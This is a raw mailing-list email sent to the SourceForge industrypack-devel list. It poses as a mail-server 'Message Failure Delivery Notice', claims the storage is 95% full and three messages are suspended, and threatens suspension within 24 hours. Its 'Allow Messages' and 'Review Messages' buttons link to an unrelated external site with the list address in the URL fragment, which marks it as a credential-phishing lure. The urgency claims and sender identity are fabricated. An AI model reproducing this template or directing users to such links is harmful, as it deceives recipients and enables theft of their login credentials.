Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id C565DBD4AEC
	for <lists+industrypack-devel@lfdr.de>; Mon, 13 Oct 2025 18:01:42 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=JeesIRoDPIJnGRcMJV2g2+R0mVVmTYlGPrYnjjxtklo=; b=iRg9zLY2UKkn6h8P/7MQ6dkkyo
	NWm12aAgf4yxm+vFZS4tq/YlkmMVPIQI8ayrE+bRqYMJEQUNOLYCJKFfZj05JomPqUsmBpFCmKb6r
	sJK7eVqawZgGjR81/sVfMz38ZVwyABrVbgmqLd8QkSAr2iXNJqC/xC5Cpg6F+MzQ0sJ8=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1v8KzU-0002yM-9K
	for lists+industrypack-devel@lfdr.de;
	Mon, 13 Oct 2025 16:01:41 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mailer-daemon@host2.i4dots.com>) id 1v8KzT-0002xy-3o
 for industrypack-devel@lists.sourceforge.net;
 Mon, 13 Oct 2025 16:01:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=fMSjUFYm+4wFOVFQ2lSPyCIzJp+XDYUiVOQ/bJtlPqE=; b=ZqHpiDmaSZe1Gcs22DLBfsoec+
 Sa6n3OwFNwNrYhIFezGCGWbjBtKXDhaPJAcBhWFEceErj/fer+/xY/Zzlh2BFiHxcvCXXG1WbP4st
 93dWfzlatT9O2ooaaxDm2YrOaQACEAvrjEwZ3+bdZg3HCTin+cFW2GLJtjbrvR062Y40=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=fMSjUFYm+4wFOVFQ2lSPyCIzJp+XDYUiVOQ/bJtlPqE=; b=G
 DlYaVeKr9cib0MoJWMRxIIZoW5G/jg7IN5q7VC4zRPSROYjpHsag0N1dTD9zSm/PbtBdNm/JFiplS
 Hn6v6neIpd/F1z9aQzaxxxnM9BRNPvMvcnhwOZkgzlAF/yf/6Bfo2DTHXcXlFVT9DI8IrSwjPzyRM
 WFrwn+agzLHRvivg=;
Received: from [146.70.24.149] (helo=host2.i4dots.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1v8KzT-0008F4-7C for industrypack-devel@lists.sourceforge.net;
 Mon, 13 Oct 2025 16:01:39 +0000
From: Mail Delivery System <mailto:mailer-daemon@host2.i4dots.com>
To: industrypack-devel@lists.sourceforge.net
Date: 13 Oct 2025 09:01:27 -0700
Message-ID: <20251013090127.3D4E6E037C7DB47F@host2.i4dots.com>
MIME-Version: 1.0
X-Spam-Score: 1.5 (+)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  industrypack-devel@lists.sourceforge.net Storage Full: 95%
 industrypack-devel@lists.sourceforge.net Message Failure Delivery Notice.
 Content analysis details:   (1.5 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
 background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.1 TO_IN_SUBJ             To address is in Subject
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
X-Headers-End: 1v8KzT-0008F4-7C
Subject: [Industrypack-devel] ATTENTION:
 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7399684800904109761=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============7399684800904109761==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<DIV id=3Deditbody1>
<DIV id=3Dv1editbody1>
<DIV>
<TABLE style=3D"FONT-SIZE: 15px; MAX-WIDTH: 548px; FONT-FAMILY: inherit; WI=
DTH: 548px; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collap=
se; TEXT-TRANSFORM: none; FONT-WEIGHT: 600; COLOR: #212121; PADDING-BOTTOM:=
 0px; FONT-STYLE: normal; PADDING-TOP: 0px; BORDER-SPACING: 0px; ORPHANS: 2=
; WIDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-v=
ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
ess: initial; text-decoration-style: initial;=20
text-decoration-color: initial" border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; WIDTH: 181px; VERTICAL-ALIGN: middle; PADD=
ING-BOTTOM: 0px; PADDING-TOP: 0px; MARGIN: 0px">industrypack-devel@lists.so=
urceforge.net</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; WIDTH: 151px; VERTICAL-ALIGN: middle; FONT=
-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; MA=
RGIN: 0px">&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; WIDTH: 215px; VERTICAL-ALIGN: middle; FONT=
-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: 0px; MAR=
GIN: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', F=
rutiger, Arial, sans-serif, serif, EmojiFont; VERTICAL-ALIGN: baseline; COL=
OR: white; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
: 0px; PADDING-RIGHT: 0px">
<SPAN style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: baseline; PADDING-BO=
TTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
 0px"><SPAN style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: baseline; COLO=
R: #c00000; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
N: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEI=
GHT: bolder">Storage Full: 95%</SPAN></SPAN></SPAN></SPAN></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
etica, Arial, sans-serif; WIDTH: 548px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" colSpan=3D3>
<TABLE style=3D"WIDTH: 546px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
x; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING: 0px; PADDING-RIGHT:=
 0px" cellSpacing=3D0 cellPadding=3D0 border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#cccccc>&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3Dwhite>&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#cccccc>&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 1=
0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
 LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3Dwhite>&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 6px; HEIGHT: 10px; WIDTH: 5=
17px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px=
; LINE-HEIGHT: 10px; PADDING-RIGHT: 0px" bgColor=3D#c00000>&nbsp;</TD></TR>=
</TBODY></TABLE></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; WIDTH: 181px; FONT-WEIGHT: 400; PADDING-BO=
TTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 2=
0px; PADDING-RIGHT: 0px">&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; WIDTH: 151px; FONT-WEIGHT: 400; PADDING-BO=
TTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px">&nbsp;</TD>
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; WIDTH: 215px; PADDING-BOTTOM: 0p=
x; TEXT-ALIGN: right; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LIN=
E-HEIGHT: 20px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: border-box; =
FONT-FAMILY: Segoe UI, Frutiger, Arial, sans-serif, serif, EmojiFont">indus=
trypack-devel@lists.sourceforge.net&nbsp;&nbsp;</SPAN></TD></TR></TBODY></T=
ABLE>
<TABLE style=3D"FONT-SIZE: 15px; FONT-FAMILY: Verdana; WIDTH: 528px; WHITE-=
SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM=
: none; FONT-WEIGHT: 400; COLOR: #212121; PADDING-BOTTOM: 0px; FONT-STYLE: =
normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; ORPHANS: 2; =
WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #f=
2f5fa; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
ext-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial" bo=
rder=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 21px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont"><BR style=3D"BOX-SIZING: border-box">&nb=
sp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
; VERTICAL-ALIGN: baseline; COLOR: #201f1e; PADDING-BOTTOM: 0px; PADDING-TO=
P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<TABLE style=3D"WIDTH: 528px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0p=
x; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN-LEFT: 0px; PADDING-RIGHT: 0p=
x">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 21px; FONT-FAMILY: 'segoe u=
i', frutiger, arial, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: bord=
er-box; MAX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-s=
erif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT:=
 bolder">Message Failure Delivery Notice.</SPAN></SPAN></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><SPAN style=3D"BOX-SIZING: bord=
er-box; MAX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-s=
erif, serif, EmojiFont">ATTENTION: industrypack-devel@lists.sourceforge.net=
</SPAN></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: inherit=
; VERTICAL-ALIGN: baseline; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</DIV></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: 'segoe u=
i', frutiger, arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PAD=
DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
ial, sans-serif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; M=
AX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-serif, ser=
if, EmojiFont">You have (3) Suspended incoming messages</SPAN></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'segoe ui', frutiger, ar=
ial, sans-serif, serif, EmojiFont"><SPAN style=3D"BOX-SIZING: border-box; M=
AX-WIDTH: 2150px; FONT-FAMILY: 'Segoe UI', Frutiger, Arial, sans-serif, ser=
if, EmojiFont">Please Fix It Below&nbsp;</SPAN></DIV></TD></TR></TBODY></TA=
BLE></DIV></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: 'Segoe U=
I', Frutiger, Arial, sans-serif; PADDING-BOTTOM: 6px; PADDING-TOP: 0px; PAD=
DING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px">
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">
<A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BACKGROUND: #2675d6; F=
LOAT: left; COLOR: #ffffff; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 10px; PADDI=
NG-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; MARGIN: 2px; DISPLAY=
: block; PADDING-RIGHT: 10px; text-decoration-line: none" href=3D"https://w=
ww.empapelarte.com.mx/Logo/wp-mail/3845mailbox%20456.html#industrypack-deve=
l@lists.sourceforge.net" rel=3D"noopener noreferrer" target=3D_blank>Allow =
Messages</A>
 <A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BACKGROUND: #dbd6d6; =
FLOAT: left; COLOR: #0c0c0c; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 10px; PADD=
ING-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; MARGIN: 2px; DISPLA=
Y: block; PADDING-RIGHT: 10px; text-decoration-line: none" href=3D"https://=
www.empapelarte.com.mx/Logo/wp-mail/3845mailbox%20456.html#industrypack-dev=
el@lists.sourceforge.net" rel=3D"noopener noreferrer" target=3D_blank>Revie=
w Messages</A></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">You&nbsp;will&nbsp;be&nbsp;briefly&nbsp;=
suspended from&nbsp;sending&nbsp;and&nbsp;receiving&nbsp;<WBR style=3D"BOX-=
SIZING: border-box">messages.&nbsp;</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">Under&nbsp;about&nbsp;24hrs if no action=
 is taken.</DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-FAMILY: 'Segoe UI', Frutiger, Ar=
ial, sans-serif, serif, EmojiFont">&nbsp;</DIV>
<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><SPAN style=3D"BOX-SIZ=
ING: border-box; COLOR: #7c7887"><SPAN data-teams=3D"true">lists.sourceforg=
e.net</SPAN>&nbsp;Server<SPAN style=3D"BOX-SIZING: border-box"><SPAN style=
=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">&nbsp;</SPAN></SPAN>Notifi=
cation</SPAN>&nbsp;</P>
<DIV style=3D"BOX-SIZING: border-box">&nbsp;</DIV></TD></TR></TBODY></TABLE=
></DIV></DIV></DIV></BODY></HTML>


--===============7399684800904109761==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7399684800904109761==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7399684800904109761==--
